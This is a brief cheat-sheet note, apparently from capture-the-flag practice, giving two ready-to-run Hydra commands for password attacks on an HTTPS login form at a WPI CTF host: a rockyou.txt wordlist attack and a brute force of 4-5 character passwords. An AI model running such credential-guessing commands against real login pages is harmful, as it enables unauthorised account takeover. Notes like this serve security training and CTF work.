### HTML form-data bruteforce & wordlist attack
src - https://medium.com/liveonnetwork/hydra-tryhackme-f3efb6658ac0
#### Wordlist
```bash
hydra -P rockyou.txt -I -l example_user  wpiadmin.wpictf.xyz  https-post-form "/studLogin:inputUsername=example_user&inputPassword=^PASS^:Invalid username/password" 
```

#### Bruteforce
```bash
hydra -x 4:5:Aa1 -I -l example_user  wpiadmin.wpictf.xyz  https-post-form "/studLogin:inputUsername=example_user&inputPassword=^PASS^:Invalid username/password" 
```
